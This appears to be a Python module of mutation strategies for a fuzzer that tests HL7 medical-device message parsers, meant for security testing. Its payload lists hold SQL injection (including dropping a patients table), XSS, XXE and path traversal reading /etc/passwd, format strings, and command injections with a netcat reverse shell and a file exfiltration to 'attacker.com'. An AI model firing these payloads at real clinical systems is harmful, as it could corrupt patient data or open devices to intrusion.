# Medaudit HL7 Fuzzer - Mutation Strategies
# Dedicated fuzzer for medical device security testing

"""
HL7 Mutation Strategies

This module provides various mutation strategies for fuzzing HL7 messages.
Strategies are designed to test medical device robustness and security.

Supported mutation types:
- Field mutations (empty, null, overflow, special chars, SQL injection, format strings)
- Delimiter mutations (pipe, caret, tilde, ampersand)
- Segment manipulations (add, remove, reorder)
- Boundary value testing
"""

import random
import string
from typing import List, Generator


class FuzzingStrategies:
    """
    Collection of mutation strategies for HL7 fuzzing.
    
    This class provides methods to mutate different parts of HL7 messages
    to test medical device robustness and uncover security vulnerabilities.
    
    Strategy Categories:
    - Field-level: Mutate individual field values
    - Delimiter-level: Modify HL7 delimiters (|, ^, ~, &)
    - Segment-level: Add, remove, or reorder segments
    - Boundary testing: Edge case values for numeric/date fields
    
    Example:
        >>> strategies = FuzzingStrategies()
        >>> mutated = strategies.mutate_field("12345", "overflow")
        >>> print(len(mutated))  # Will be very long
    """
    
    # Mutation payloads for various attack types
    OVERFLOW_PAYLOADS = [
        "A" * 100,
        "A" * 1000,
        "A" * 10000,
        "A" * 65535,
        "%" * 1000,
        "\x00" * 100,
        "\\x00" * 100,
    ]
    
    SPECIAL_CHAR_PAYLOADS = [
        "|^~\\&",  # HL7 encoding chars
        "\x00",   # Null byte
        "\r\n",   # Line endings
        "\x0b",   # VT (MLLP start)
        "\x1c",   # FS (MLLP end)
        "\\|",    # Escaped pipe
        "^~\\&",  # Partial encoding chars
        "\t\n\r", # Whitespace chars
        "../../../../etc/passwd",  # Path traversal
        "<script>alert(1)</script>",  # XSS
        "{{7*7}}",  # Template injection
    ]
    
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "'; DROP TABLE patients;--",
        "1 UNION SELECT * FROM users",
        "' AND SLEEP(5)--",
        "1; EXEC xp_cmdshell('whoami')",
        "'-var x=1-'",
        "admin'--",
        "1' ORDER BY 1--",
        "' HAVING 1=1--",
    ]
    
    FORMAT_STRING_PAYLOADS = [
        "%s%s%s%s%s",
        "%n%n%n%n%n",
        "%x%x%x%x%x",
        "%d%d%d%d%d",
        "%p%p%p%p%p",
        "%.1000000d",
        "%99999999999s",
        "AAAA%08x.%08x.%08x.%08x",
        "%@" * 20,
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "&& ping -c 1 127.0.0.1",
        "|| true",
        "; nc -e /bin/sh attacker.com 4444",
        "| nc attacker.com 4444 < /etc/passwd",
    ]
    
    UNICODE_PAYLOADS = [
        "\u0000",  # Null
        "\uffff",  # Max BMP
        "\ud800",  # Surrogate
        "Ａ" * 100,  # Fullwidth
        "تجربة",  # Arabic
        "测试",   # Chinese
        "🔥" * 50,  # Emoji
        "\u202e" + "dlrow olleh",  # RTL override
    ]
    
    def mutate_field(self, value: str, mutation_type: str = "random") -> str:
        """
        Apply a mutation strategy to a field value.
        
        Args:
            value: Original field value to mutate
            mutation_type: Type of mutation to apply:
                - 'empty': Empty string
                - 'null': Null bytes
                - 'long'/'overflow': Very long strings
                - 'special': Special characters
                - 'sql': SQL injection payloads
                - 'format': Format string attacks
                - 'cmd': Command injection
                - 'unicode': Unicode edge cases
                - 'random': Random mutation type
        
        Returns:
            Mutated field value
            
        Example:
            >>> s = FuzzingStrategies()
            >>> s.mutate_field("John", "sql")
            "' OR '1'='1"
        """
        mutations = {
            "empty": "",
            "null": "\x00" * len(value) if value else "\x00",
            "long": "A" * 10000,
            "overflow": random.choice(self.OVERFLOW_PAYLOADS),
            "special": random.choice(self.SPECIAL_CHAR_PAYLOADS),
            "sql": random.choice(self.SQL_INJECTION_PAYLOADS),
            "format": random.choice(self.FORMAT_STRING_PAYLOADS),
            "cmd": random.choice(self.COMMAND_INJECTION_PAYLOADS),
            "unicode": random.choice(self.UNICODE_PAYLOADS),
            "xss": "<script>alert('XSS')</script>",
            "xxe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        }
        
        if mutation_type == "random":
            mutation_type = random.choice(list(mutations.keys()))
        
        return mutations.get(mutation_type, value)
    
    def generate_boundary_values(self) -> List[str]:
        """
        Generate boundary test values for numeric and date fields.
        
        Returns:
            List of boundary test values including:
            - Numeric boundaries (0, -1, max int, min int)
            - Date boundaries (epoch, future, invalid)
            - String boundaries (empty, single char, long)
            
        Example:
            >>> s = FuzzingStrategies()
            >>> values = s.generate_boundary_values()
            >>> "-1" in values
            True
        """
        return [
            # Numeric boundaries
            "0",
            "-1",
            "1",
            "-999999999",
            "999999999",
            "2147483647",   # Max 32-bit signed
            "-2147483648",  # Min 32-bit signed
            "9223372036854775807",  # Max 64-bit signed
            "1e308",        # Large float
            "-1e308",       # Large negative float
            "NaN",
            "Infinity",
            "-Infinity",
            
            # Date boundaries
            "00000000",     # Invalid date
            "19000101",     # Very old date
            "99991231",     # Far future
            "20991231235959",  # Future timestamp
            "19700101000000",  # Unix epoch
            "00010101",     # Year 1
            "29991231",     # Year 2999
            
            # String boundaries
            "",             # Empty
            " ",            # Single space
            "X",            # Single char
            "X" * 255,      # Max typical varchar
            "X" * 65535,    # Max text
        ]
    
    def mutate_delimiter(self, message: str) -> Generator[str, None, None]:
        """
        Generate messages with mutated HL7 delimiters.
        
        HL7 uses specific delimiters (|^~\\&) defined in MSH-2.
        Mutating these can reveal parsing vulnerabilities.
        
        Args:
            message: Original HL7 message
            
        Yields:
            Messages with modified delimiters
            
        Example:
            >>> s = FuzzingStrategies()
            >>> msg = "MSH|^~\\\\&|TEST|..."
            >>> for mutated in s.mutate_delimiter(msg):
            ...     print(mutated[:20])
        """
        # Alternative delimiters to try
        delimiter_sets = [
            ("|", "^", "~", "\\", "&"),  # Standard
            ("!", "@", "#", "$", "%"),   # Alt set 1
            ("\t", ":", ";", "/", "+"),  # Alt set 2
            ("\x00", "\x01", "\x02", "\x03", "\x04"),  # Control chars
            ("|", "|", "|", "|", "|"),   # All same
            ("", "^", "~", "\\", "&"),   # Empty field sep
            ("|" * 10, "^", "~", "\\", "&"),  # Long field sep
        ]
        
        for field_sep, comp_sep, rep_sep, esc_char, sub_sep in delimiter_sets:
            # Replace delimiters in message
            mutated = message
            mutated = mutated.replace("|", field_sep)
            
            # Update MSH-2 encoding characters
            if "MSH" in mutated:
                segments = mutated.split("\r")
                for i, seg in enumerate(segments):
                    if seg.startswith("MSH"):
                        # MSH-2 is the encoding characters
                        fields = seg.split(field_sep)
                        if len(fields) > 1:
                            fields[1] = f"{comp_sep}{rep_sep}{esc_char}{sub_sep}"
                            segments[i] = field_sep.join(fields)
                mutated = "\r".join(segments)
            
            yield mutated
    
    def add_segments(self, message: str, count: int = 5) -> Generator[str, None, None]:
        """
        Generate messages with additional segments injected.
        
        Args:
            message: Original HL7 message
            count: Number of segment variations to generate
            
        Yields:
            Messages with extra segments added
            
        Example:
            >>> s = FuzzingStrategies()
            >>> msg = "MSH|...|\\rPID|..."
            >>> for mutated in s.add_segments(msg, 2):
            ...     print("Segments:", mutated.count("\\r") + 1)
        """
        # Malicious segments to inject
        injection_segments = [
            # Standard segments with payloads
            "ZZZ|' OR '1'='1|INJECTED",
            "NTE|1|L|<script>alert(1)</script>",
            "OBX|1|ST|PAYLOAD||%n%n%n%n%n",
            
            # Overflow segments
            f"ZZZ|{'A' * 10000}",
            f"NTE|{'1|' * 100}",
            
            # Control character segments
            "ZZZ|\x00\x00\x00|TEST",
            "NTE|1|\x0b\x1c|MLLP",
            
            # Malformed segments
            "|||||||",
            "ZZZ",
            "A" * 1000,
        ]
        
        segments = message.split("\r")
        
        for _ in range(count):
            injection = random.choice(injection_segments)
            insert_pos = random.randint(1, len(segments))
            new_segments = segments[:insert_pos] + [injection] + segments[insert_pos:]
            yield "\r".join(new_segments)
    
    def remove_segments(self, message: str) -> Generator[str, None, None]:
        """
        Generate messages with segments removed.
        
        Tests how the device handles missing required segments.
        
        Args:
            message: Original HL7 message
            
        Yields:
            Messages with various segments removed
            
        Example:
            >>> s = FuzzingStrategies()
            >>> msg = "MSH|...|\\rPID|...|\\rPV1|..."
            >>> for mutated in s.remove_segments(msg):
            ...     print("Has PID:", "PID" in mutated)
        """
        segments = message.split("\r")
        
        # Try removing each non-MSH segment
        for i in range(1, len(segments)):
            new_segments = segments[:i] + segments[i+1:]
            yield "\r".join(new_segments)
        
        # Try removing all except MSH
        if len(segments) > 1:
            yield segments[0]
        
        # Try removing MSH (should cause errors)
        if len(segments) > 1:
            yield "\r".join(segments[1:])
    
    def reorder_segments(self, message: str, count: int = 5) -> Generator[str, None, None]:
        """
        Generate messages with segments in different orders.
        
        HL7 messages often have expected segment ordering.
        Reordering can reveal order-dependent vulnerabilities.
        
        Args:
            message: Original HL7 message
            count: Number of reordered variations to generate
            
        Yields:
            Messages with shuffled segment order
            
        Example:
            >>> s = FuzzingStrategies()
            >>> msg = "MSH|...|\\rPID|...|\\rPV1|..."
            >>> for mutated in s.reorder_segments(msg, 2):
            ...     print(mutated.split("\\r")[0][:3])  # MSH should be first
        """
        segments = message.split("\r")
        
        if len(segments) <= 2:
            return
        
        # Keep MSH first, shuffle the rest
        msh = segments[0]
        rest = segments[1:]
        
        for _ in range(count):
            shuffled = rest.copy()
            random.shuffle(shuffled)
            yield msh + "\r" + "\r".join(shuffled)
    
    def get_all_mutations_for_field(self, value: str) -> List[dict]:
        """
        Get all possible mutations for a field value.
        
        Args:
            value: Original field value
            
        Returns:
            List of dicts with mutation type and mutated value
            
        Example:
            >>> s = FuzzingStrategies()
            >>> mutations = s.get_all_mutations_for_field("12345")
            >>> len(mutations) > 10
            True
        """
        mutation_types = [
            "empty", "null", "long", "overflow", "special",
            "sql", "format", "cmd", "unicode", "xss", "xxe"
        ]
        
        result = []
        for mut_type in mutation_types:
            result.append({
                "type": mut_type,
                "original": value,
                "mutated": self.mutate_field(value, mut_type)
            })
        
        # Add boundary values
        for boundary in self.generate_boundary_values():
            result.append({
                "type": "boundary",
                "original": value,
                "mutated": boundary
            })
        
        return result
